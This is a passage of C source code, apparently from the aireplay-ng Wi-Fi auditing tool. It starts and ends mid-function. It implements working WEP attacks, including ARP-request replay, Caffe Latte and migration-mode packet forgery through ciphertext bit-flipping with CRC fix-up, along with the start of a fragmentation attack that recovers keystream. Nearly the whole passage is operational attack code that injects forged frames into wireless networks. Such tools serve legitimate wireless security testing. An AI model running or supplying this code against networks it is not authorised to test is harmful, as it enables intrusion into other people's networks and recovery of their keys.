time( NULL );\n                nb_bad_pkt = 0;\n            }\n        }\n\n        if( h80211[0] == 0xD4 &&\n            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )\n        {\n            nb_ack_pkt++;\n        }\n\n        /* check if it's a potential ARP request */\n\n        opt.f_minlen = opt.f_maxlen = 68;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n            goto add_arp;\n\n        opt.f_minlen = opt.f_maxlen = 86;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n        {\nadd_arp:\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            switch( h80211[1] & 3 )\n            {\n                case  1: /* ToDS */\n                {\n                    /* keep as a ToDS packet */\n\n                    memcpy( h80211 +  4, opt.f_bssid, 6 );\n                    memcpy( h80211 + 10, opt.r_smac,  6 );\n                    memcpy( h80211 + 16, opt.f_dmac,  6 );\n\n                    h80211[1] = 0x41;   /* ToDS & WEP  */\n                }\n                case  2: /* FromDS */\n                {\n                    if( opt.r_fromdsinj )\n                    {\n                        /* keep as a FromDS packet */\n\n                        memcpy( h80211 +  4, opt.f_dmac,  6 );\n                        memcpy( h80211 + 10, opt.f_bssid, 6 );\n                        memcpy( h80211 + 16, opt.r_smac,  6 );\n\n                        h80211[1] = 0x42;   /* FromDS & WEP  */\n                    }\n                    else\n                    {\n                        /* rewrite header to make it a ToDS packet */\n\n                        memcpy( h80211 +  4, opt.f_bssid, 6 );\n                        memcpy( h80211 + 10, opt.r_smac,  6 );\n                        memcpy( h80211 + 16, opt.f_dmac,  6 );\n\n                        h80211[1] = 0x41;   /* ToDS & WEP  */\n                    }\n                }\n            }\n\n            //should be correct already, keep qos/wds status\n//             h80211[0] = 0x08;   /* normal data */\n\n            /* if same IV, perhaps our own packet, skip it */\n\n            for( i = 0; i < nb_arp; i++ )\n            {\n                if( memcmp( h80211 + z, arp[i].buf + arp[i].hdrlen, 4 ) == 0 )\n                    break;\n            }\n\n            if( i < nb_arp )\n                continue;\n\n            if( caplen > 128)\n                continue;\n            /* add the ARP request in the ring buffer */\n\n            nb_arp_tot++;\n\n            /* Ring buffer size: by default: 8 ) */\n\n            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)\n            {\n                /* no more room, overwrite oldest entry */\n\n                memcpy( arp[arp_off2].buf, h80211, caplen );\n                arp[arp_off2].len = caplen;\n                arp[arp_off2].hdrlen = z;\n\n                if( ++arp_off2 >= nb_arp )\n                    arp_off2 = 0;\n            } else {\n\n                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {\n                    perror( \"malloc failed\" );\n                    return( 1 );\n                }\n\n                memcpy( arp[nb_arp].buf, h80211, caplen );\n                arp[nb_arp].len = caplen;\n                arp[nb_arp].hdrlen = z;\n                nb_arp++;\n\n                pkh.tv_sec  = tv.tv_sec;\n                pkh.tv_usec = tv.tv_usec;\n                pkh.caplen  = caplen;\n                pkh.len     = caplen;\n\n                n = sizeof( pkh );\n\n                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                n = pkh.caplen;\n\n                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                fflush( f_cap_out );\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_caffe_latte( void )\n{\n    int nb_bad_pkt;\n    int arp_off1, arp_off2;\n    int i, n, caplen, nb_arp, z;\n    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;\n    unsigned char flip[4096];\n\n    time_t tc;\n    float f, ticks[3];\n    struct timeval tv;\n    struct timeval tv2;\n    struct tm *lt;\n\n    FILE *f_cap_out;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n    struct ARP_req * arp;\n\n    /* capture only WEP data to broadcast address */\n\n    opt.f_type    = 2;\n    opt.f_subtype = 0;\n    opt.f_iswep   = 1;\n    opt.f_fromds  = 0;\n\n    if(getnet(NULL, 1, 1) != 0)\n        return 1;\n\n    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a BSSID (-b).\\n\" );\n        return( 1 );\n    }\n    /* create and write the output pcap header */\n\n    gettimeofday( &tv, NULL );\n\n    pfh_out.magic         = TCPDUMP_MAGIC;\n    pfh_out.version_major = PCAP_VERSION_MAJOR;\n    pfh_out.version_minor = PCAP_VERSION_MINOR;\n    pfh_out.thiszone      = 0;\n    pfh_out.sigfigs       = 0;\n    pfh_out.snaplen       = 65535;\n    pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n    lt = localtime( (const time_t *) &tv.tv_sec );\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_arp-%02d%02d-%02d%02d%02d.cap\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"Saving ARP requests in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = sizeof( struct pcap_file_header );\n\n    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\\n\" );\n        return( 1 );\n    }\n\n    fflush( f_cap_out );\n\n    printf( \"You should also start airodump-ng to capture replies.\\n\" );\n\n    if(opt.port_in <= 0)\n    {\n        /* avoid blocking on reading the socket */\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    if ( opt.ringbuffer )\n        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );\n    else\n        arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    tc = time( NULL ) - 11;\n\n    nb_pkt_read = 0;\n    nb_bad_pkt  = 0;\n    nb_ack_pkt  = 0;\n    nb_arp      = 0;\n    nb_arp_tot  = 0;\n    arp_off1    = 0;\n    arp_off2    = 0;\n\n    while( 1 )\n    {\n        /* sleep until the next clock tick */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rRead %ld packets (%ld ARPs, %ld ACKs), \"\n                    \"sent %ld packets...(%d pps)\\r\",\n                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)) );\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )\n        {\n            /* threshold reach, send one frame */\n\n            ticks[2] = 0;\n\n            if( nb_arp > 0 )\n            {\n                if( nb_pkt_sent == 0 )\n                    ticks[0] = 0;\n\n                if( send_packet( arp[arp_off1].buf,\n                                 arp[arp_off1].len ) < 0 )\n                    return( 1 );\n\n                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )\n                {\n                    if( send_packet( arp[arp_off1].buf,\n                                    arp[arp_off1].len ) < 0 )\n                        return( 1 );\n                }\n\n                if( ++arp_off1 >= nb_arp )\n                    arp_off1 = 0;\n            }\n        }\n\n        /* read a frame, and check if it's an ARP request */\n\n        if( opt.s_file == NULL )\n        {\n            gettimeofday( &tv, NULL );\n\n            caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n            if( caplen  < 0 ) return( 1 );\n            if( caplen == 0 ) continue;\n        }\n        else\n        {\n            n = sizeof( pkh );\n\n            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {\n                SWAP32( pkh.caplen );\n                SWAP32( pkh.len );\n            }\n\n            tv.tv_sec  = pkh.tv_sec;\n            tv.tv_usec = pkh.tv_usec;\n\n            n = caplen = pkh.caplen;\n\n            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )\n            {\n                printf( \"\\r\\33[KInvalid packet length %d.\\n\", n );\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )\n            {\n                /* remove the prism header */\n\n                if( h80211[7] == 0x40 )\n                    n = 64;\n                else\n                    n = *(int *)( h80211 + 4 );\n\n                if( n < 8 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )\n            {\n                /* remove the radiotap header */\n\n                n = *(unsigned short *)( h80211 + 2 );\n\n                if( n <= 0 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )\n            {\n                /* remove the PPI header */\n\n                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                /* for a while Kismet logged broken PPI headers */\n                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )\n                    n = 32;\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n        }\n\n        nb_pkt_read++;\n\n        /* check if it's a disas. or deauth packet */\n\n        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&\n            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )\n        {\n            nb_bad_pkt++;\n\n            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )\n            {\n                printf( \"\\33[KNotice: got a deauth/disassoc packet. Is the \"\n                        \"source MAC associated ?\\n\" );\n\n                tc = time( NULL );\n                nb_bad_pkt = 0;\n            }\n        }\n\n        if( h80211[0] == 0xD4 &&\n            ! memcmp( h80211 + 4, opt.f_bssid, 6 ) )\n        {\n            nb_ack_pkt++;\n        }\n\n        /* check if it's a potential ARP request */\n\n        opt.f_minlen = opt.f_maxlen = 68;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n            goto add_arp;\n\n        opt.f_minlen = opt.f_maxlen = 86;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n        {\nadd_arp:\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            switch( h80211[1] & 3 )\n            {\n                case  0: /* ad-hoc */\n                {\n                    if(memcmp(h80211 + 16, BROADCAST, 6) == 0)\n                    {\n                        /* rewrite to an ad-hoc packet */\n\n                        memcpy( h80211 +  4, BROADCAST, 6 );\n                        memcpy( h80211 + 10, opt.r_smac,  6 );\n                        memcpy( h80211 + 16, opt.f_bssid,  6 );\n\n                        h80211[1] = 0x40;   /* WEP  */\n                    }\n                    else\n                    {\n                        nb_arp_tot++;\n                        continue;\n                    }\n\n                    break;\n                }\n                case  1: /* ToDS */\n                {\n                    if(memcmp(h80211 + 16, BROADCAST, 6) == 0)\n                    {\n                        /* rewrite to a FromDS packet */\n\n                        memcpy( h80211 +  4, BROADCAST, 6 );\n                        memcpy( h80211 + 10, opt.f_bssid,  6 );\n                        memcpy( h80211 + 16, opt.f_bssid,  6 );\n\n                        h80211[1] = 0x42;   /* ToDS & WEP  */\n                    }\n                    else\n                    {\n                        nb_arp_tot++;\n                        continue;\n                    }\n\n                    break;\n                }\n                default:\n                    continue;\n            }\n\n//             h80211[0] = 0x08;   /* normal data */\n\n            /* if same IV, perhaps our own packet, skip it */\n\n            for( i = 0; i < nb_arp; i++ )\n            {\n                if( memcmp( h80211 + z, arp[i].buf + arp[i].hdrlen, 4 ) == 0 )\n                    break;\n            }\n\n            if( i < nb_arp )\n                continue;\n\n            if( caplen > 128)\n                continue;\n            /* add the ARP request in the ring buffer */\n\n            nb_arp_tot++;\n\n            /* Ring buffer size: by default: 8 ) */\n\n            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)\n                continue;\n            else {\n\n                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {\n                    perror( \"malloc failed\" );\n                    return( 1 );\n                }\n\n                memset(flip, 0, 4096);\n\n//                 flip[49-24-4] ^= ((rand() % 255)+1); //flip random bits in last byte of sender MAC\n//                 flip[53-24-4] ^= ((rand() % 255)+1); //flip random bits in last byte of sender IP\n                flip[z+21] ^= ((rand() % 255)+1); //flip random bits in last byte of sender MAC\n                flip[z+25] ^= ((rand() % 255)+1); //flip random bits in last byte of sender IP\n\n                add_crc32_plain(flip, caplen-z-4-4);\n                for(i=0; i<caplen-z-4; i++)\n                    (h80211+z+4)[i] ^= flip[i];\n\n                memcpy( arp[nb_arp].buf, h80211, caplen );\n                arp[nb_arp].len = caplen;\n                arp[nb_arp].hdrlen = z;\n                nb_arp++;\n\n                pkh.tv_sec  = tv.tv_sec;\n                pkh.tv_usec = tv.tv_usec;\n                pkh.caplen  = caplen;\n                pkh.len     = caplen;\n\n                n = sizeof( pkh );\n\n                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                n = pkh.caplen;\n\n                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                fflush( f_cap_out );\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_migmode( void )\n{\n    int nb_bad_pkt;\n    int arp_off1, arp_off2;\n    int i, n, caplen, nb_arp, z;\n    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;\n    unsigned char flip[4096];\n    unsigned char senderMAC[6];\n\n    time_t tc;\n    float f, ticks[3];\n    struct timeval tv;\n    struct timeval tv2;\n    struct tm *lt;\n\n    FILE *f_cap_out;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n    struct ARP_req * arp;\n\n    if ( opt.ringbuffer )\n        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );\n    else\n        arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );\n\n    /* capture only WEP data to broadcast address */\n\n    opt.f_type    = 2;\n    opt.f_subtype = 0;\n    opt.f_iswep   = 1;\n    opt.f_fromds  = 1;\n\n    if(getnet(NULL, 1, 1) != 0)\n        return 1;\n\n    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a BSSID (-b).\\n\" );\n        return( 1 );\n    }\n    /* create and write the output pcap header */\n\n    gettimeofday( &tv, NULL );\n\n    pfh_out.magic         = TCPDUMP_MAGIC;\n    pfh_out.version_major = PCAP_VERSION_MAJOR;\n    pfh_out.version_minor = PCAP_VERSION_MINOR;\n    pfh_out.thiszone      = 0;\n    pfh_out.sigfigs       = 0;\n    pfh_out.snaplen       = 65535;\n    pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n    lt = localtime( (const time_t *) &tv.tv_sec );\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_arp-%02d%02d-%02d%02d%02d.cap\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"Saving ARP requests in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = sizeof( struct pcap_file_header );\n\n    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\\n\" );\n        return( 1 );\n    }\n\n    fflush( f_cap_out );\n\n    printf( \"You should also start airodump-ng to capture replies.\\n\" );\n    printf( \"Remember to filter the capture to only keep WEP frames: \");\n    printf( \" \\\"tshark -R 'wlan.wep.iv' -r capture.cap -w outcapture.cap\\\"\\n\");\n    //printf( \"Remember to filter the capture to keep only broadcast From-DS frames.\\n\");\n\n    if(opt.port_in <= 0)\n    {\n        /* avoid blocking on reading the socket */\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    tc = time( NULL ) - 11;\n\n    nb_pkt_read = 0;\n    nb_bad_pkt  = 0;\n    nb_ack_pkt  = 0;\n    nb_arp      = 0;\n    nb_arp_tot  = 0;\n    arp_off1    = 0;\n    arp_off2    = 0;\n\n    while( 1 )\n    {\n        /* sleep until the next clock tick */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rRead %ld packets (%ld ARPs, %ld ACKs), \"\n                    \"sent %ld packets...(%d pps)\\r\",\n                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)) );\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )\n        {\n            /* threshold reach, send one frame */\n\n            ticks[2] = 0;\n\n            if( nb_arp > 0 )\n            {\n                if( nb_pkt_sent == 0 )\n                    ticks[0] = 0;\n\n                if( send_packet( arp[arp_off1].buf,\n                                 arp[arp_off1].len ) < 0 )\n                    return( 1 );\n\n                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )\n                {\n                    if( send_packet( arp[arp_off1].buf,\n                                    arp[arp_off1].len ) < 0 )\n                        return( 1 );\n                }\n\n                if( ++arp_off1 >= nb_arp )\n                    arp_off1 = 0;\n            }\n        }\n\n        /* read a frame, and check if it's an ARP request */\n\n        if( opt.s_file == NULL )\n        {\n            gettimeofday( &tv, NULL );\n\n            caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n            if( caplen  < 0 ) return( 1 );\n            if( caplen == 0 ) continue;\n        }\n        else\n        {\n            n = sizeof( pkh );\n\n            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {\n                SWAP32( pkh.caplen );\n                SWAP32( pkh.len );\n            }\n\n            tv.tv_sec  = pkh.tv_sec;\n            tv.tv_usec = pkh.tv_usec;\n\n            n = caplen = pkh.caplen;\n\n            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )\n            {\n                printf( \"\\r\\33[KInvalid packet length %d.\\n\", n );\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )\n            {\n                /* remove the prism header */\n\n                if( h80211[7] == 0x40 )\n                    n = 64;\n                else\n                    n = *(int *)( h80211 + 4 );\n\n                if( n < 8 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )\n            {\n                /* remove the radiotap header */\n\n                n = *(unsigned short *)( h80211 + 2 );\n\n                if( n <= 0 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )\n            {\n                /* remove the PPI header */\n\n                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                /* for a while Kismet logged broken PPI headers */\n                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )\n                    n = 32;\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n        }\n\n        nb_pkt_read++;\n\n        /* check if it's a disas. or deauth packet */\n\n        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&\n            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )\n        {\n            nb_bad_pkt++;\n\n            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )\n            {\n                printf( \"\\33[KNotice: got a deauth/disassoc packet. Is the \"\n                        \"source MAC associated ?\\n\" );\n\n                tc = time( NULL );\n                nb_bad_pkt = 0;\n            }\n        }\n\n        if( h80211[0] == 0xD4 &&\n            ! memcmp( h80211 + 4, opt.f_bssid, 6 ) )\n        {\n            nb_ack_pkt++;\n        }\n\n        /* check if it's a potential ARP request */\n\n        opt.f_minlen = opt.f_maxlen = 68;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n            goto add_arp;\n\n        opt.f_minlen = opt.f_maxlen = 86;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n        {\nadd_arp:\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            switch( h80211[1] & 3 )\n            {\n                case  2: /* FromDS */\n                {\n                    if(memcmp(h80211 + 4, BROADCAST, 6) == 0)\n                    {\n                        /* backup sender MAC */\n\n                        memset( senderMAC, 0, 6 );\n                        memcpy( senderMAC, h80211 + 16, 6 );\n\n                        /* rewrite to a ToDS packet */\n\n                        memcpy( h80211 + 4, opt.f_bssid,  6 );\n                        memcpy( h80211 + 10, opt.r_smac,  6 );\n                        memcpy( h80211 + 16, BROADCAST, 6 );\n\n                        h80211[1] = 0x41;   /* ToDS & WEP  */\n                    }\n                    else\n                    {\n                        nb_arp_tot++;\n                        continue;\n                    }\n\n                    break;\n                }\n                default:\n                    continue;\n            }\n\n//             h80211[0] = 0x08;   /* normal data */\n\n            /* if same IV, perhaps our own packet, skip it */\n\n            for( i = 0; i < nb_arp; i++ )\n            {\n                if( memcmp( h80211 + z, arp[i].buf + arp[i].hdrlen, 4 ) == 0 )\n                    break;\n            }\n\n            if( i < nb_arp )\n                continue;\n\n            if( caplen > 128)\n                continue;\n            /* add the ARP request in the ring buffer */\n\n            nb_arp_tot++;\n\n            /* Ring buffer size: by default: 8 ) */\n\n            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)\n                continue;\n            else {\n\n                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {\n                    perror( \"malloc failed\" );\n                    return( 1 );\n                }\n\n                memset(flip, 0, 4096);\n\n                /* flip the sender MAC to convert it into the source MAC  */\n                flip[16] ^= (opt.r_smac[0] ^ senderMAC[0]);\n                flip[17] ^= (opt.r_smac[1] ^ senderMAC[1]);\n                flip[18] ^= (opt.r_smac[2] ^ senderMAC[2]);\n                flip[19] ^= (opt.r_smac[3] ^ senderMAC[3]);\n                flip[20] ^= (opt.r_smac[4] ^ senderMAC[4]);\n                flip[21] ^= (opt.r_smac[5] ^ senderMAC[5]);\n                flip[25] ^= ((rand() % 255)+1); //flip random bits in last byte of sender IP\n\n                add_crc32_plain(flip, caplen-z-4-4);\n                for(i=0; i<caplen-z-4; i++)\n                {\n                    (h80211+z+4)[i] ^= flip[i];\n                }\n\n                memcpy( arp[nb_arp].buf, h80211, caplen );\n                arp[nb_arp].len = caplen;\n                arp[nb_arp].hdrlen = z;\n                nb_arp++;\n\n                pkh.tv_sec  = tv.tv_sec;\n                pkh.tv_usec = tv.tv_usec;\n                pkh.caplen  = caplen;\n                pkh.len     = caplen;\n\n                n = sizeof( pkh );\n\n                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                n = pkh.caplen;\n\n                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                fflush( f_cap_out );\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint set_clear_arp(unsigned char *buf, unsigned char *smac, unsigned char *dmac) //set first 22 bytes\n{\n    if(buf == NULL)\n        return -1;\n\n    memcpy(buf, S_LLC_SNAP_ARP, 8);\n    buf[8]  = 0x00;\n    buf[9]  = 0x01; //ethernet\n    buf[10] = 0x08; // IP\n    buf[11] = 0x00;\n    buf[12] = 0x06; //hardware size\n    buf[13] = 0x04; //protocol size\n    buf[14] = 0x00;\n    if(memcmp(dmac, BROADCAST, 6) == 0)\n        buf[15]  = 0x01; //request\n    else\n        buf[15]  = 0x02; //reply\n    memcpy(buf+16, smac, 6);\n\n    return 0;\n}\n\nint set_final_arp(unsigned char *buf, unsigned char *mymac)\n{\n    if(buf == NULL)\n        return -1;\n\n    //shifted by 10bytes to set source IP as target IP :)\n\n    buf[0] = 0x08; // IP\n    buf[1] = 0x00;\n    buf[2] = 0x06; //hardware size\n    buf[3] = 0x04; //protocol size\n    buf[4] = 0x00;\n    buf[5] = 0x01; //request\n    memcpy(buf+6, mymac, 6); //sender mac\n    buf[12] = 0xA9; //sender IP 169.254.87.197\n    buf[13] = 0xFE;\n    buf[14] = 0x57;\n    buf[15] = 0xC5; //end sender IP\n\n    return 0;\n}\n\nint set_clear_ip(unsigned char *buf, int ip_len) //set first 9 bytes\n{\n    if(buf == NULL)\n        return -1;\n\n    memcpy(buf, S_LLC_SNAP_IP, 8);\n    buf[8]  = 0x45;\n    buf[10] = (ip_len >> 8)  & 0xFF;\n    buf[11] = ip_len & 0xFF;\n\n    return 0;\n}\n\nint set_final_ip(unsigned char *buf, unsigned char *mymac)\n{\n    if(buf == NULL)\n        return -1;\n\n    //shifted by 10bytes to set source IP as target IP :)\n\n    buf[0] = 0x06; //hardware size\n    buf[1] = 0x04; //protocol size\n    buf[2] = 0x00;\n    buf[3] = 0x01; //request\n    memcpy(buf+4, mymac, 6); //sender mac\n    buf[10] = 0xA9; //sender IP from 169.254.XXX.XXX\n    buf[11] = 0xFE;\n\n    return 0;\n}\n\nint do_attack_cfrag( void )\n{\n    int caplen, n;\n    struct timeval tv;\n    struct timeval tv2;\n    float f, ticks[3];\n    unsigned char bssid[6];\n    unsigned char smac[6];\n    unsigned char dmac[6];\n    unsigned char keystream[128];\n    unsigned char frag1[128], frag2[128], frag3[128];\n    unsigned char clear[4096], final[4096], flip[4096];\n    int isarp;\n    int z, i;\n\n    opt.f_fromds = 0;\n\nread_packets:\n\n    if( capture_ask_packet( &caplen, 0 ) != 0 )\n        return( 1 );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n        z+=2;\n\n    if(caplen < z)\n    {\n        goto read_packets;\n    }\n\n    if(caplen > 3800)\n    {\n        goto read_packets;\n    }\n\n    switch( h80211[1] & 3 )\n    {\n        case  0:\n            memcpy( bssid, h80211 + 16, 6 );\n            memcpy( dmac, h80211 + 4, 6 );\n            memcpy( smac, h80211 + 10, 6 );\n            break;\n        case  1:\n            memcpy( bssid, h80211 + 4, 6 );\n            memcpy( dmac, h80211 + 16, 6 );\n            memcpy( smac, h80211 + 10, 6 );\n            break;\n        case  2:\n            memcpy( bssid, h80211 + 10, 6 );\n            memcpy( dmac, h80211 + 4, 6 );\n            memcpy( smac, h80211 + 16, 6 );\n            break;\n        default:\n            memcpy( bssid, h80211 + 10, 6 );\n            memcpy( dmac, h80211 + 16, 6 );\n            memcpy( smac, h80211 + 24, 6 );\n            break;\n    }\n\n    